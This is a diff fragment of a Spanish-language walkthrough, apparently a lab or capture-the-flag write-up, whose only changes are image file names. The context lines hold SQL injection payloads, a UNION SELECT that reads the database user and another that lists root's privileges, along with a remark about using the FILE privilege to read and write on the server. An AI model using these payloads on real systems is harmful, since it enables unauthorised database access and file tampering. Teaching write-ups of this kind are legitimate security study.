@@ -336,7 +336,7 @@ Sabiendo el número de columnas (5) vamos a enumerar los usuarios.
 '+UNION+SELECT+NULL,NULL,NULL,USER(),NULL--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 
@@ -344,7 +344,7 @@ Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 '+UNION+SELECT+NULL,grantee,privilege_type,NULL,NULL+FROM+information_schema.user_privileges+WHERE+grantee%3d"'root'%40'localhost'"--+
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que tenemos permiso en **FILE** y eso indica que puede tanto escribir y leer en el backend. Comprobamos **secure\_file\_priv** si podemos escribir datos.
 
